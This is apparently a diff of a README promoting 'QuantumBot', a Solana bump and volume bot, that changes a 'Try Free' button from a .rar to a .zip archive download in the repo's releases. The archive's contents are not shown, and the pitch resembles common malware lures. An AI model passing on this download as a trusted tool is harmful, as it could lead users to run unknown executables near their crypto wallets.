@@ -8,7 +8,7 @@ QuantumBot is the best AIO-bot which includes Solana Bump, Solana Volume, Solana
 
 ## ✅ We provide 24-hour trial of our bot for free!✅
 
-[![Custom Button](https://img.shields.io/badge/Click%20Here-Try%20Free%20-blue?style=for-the-badge)](https://github.com/Trendy1206/QuantumBot/releases/download/Download/application.rar)
+[![Custom Button](https://img.shields.io/badge/Click%20Here-Try%20Free%20-blue?style=for-the-badge)](https://github.com/Trendy1206/QuantumBot/releases/download/Download/application.zip)
 
 
 ### TRIAL VERSION:
